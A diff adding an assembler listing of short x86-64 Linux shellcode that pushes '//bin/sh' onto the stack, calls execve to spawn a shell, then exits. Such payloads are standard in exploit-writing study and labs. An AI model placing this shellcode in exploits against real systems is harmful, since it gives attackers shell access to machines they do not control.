@@ -1,0 +1,18 @@
+     1                                 %line 1+1 1.asm
+     2                                 [section .text]
+     3                                 [global _start]
+     4                                 _start:
+     5                                 
+     6 00000000 4831C0                 xor rax, rax
+     7 00000003 50                     push rax
+     8 00000004 48BB2F2F62696E2F73-    mov rbx, 0x68732f6e69622f2f
+     9 00000004 68                 
+    10 0000000E 53                     push rbx
+    11                                 
+    12 0000000F B03B                   mov al, 59
+    13 00000011 4889E7                 mov rdi, rsp
+    14 00000014 0F05                   syscall
+    15                                 
+    16 00000016 48C7C03C000000         mov rax, 60
+    17 0000001D 48C7C700000000         mov rdi, 0
+    18 00000024 0F05                   syscall
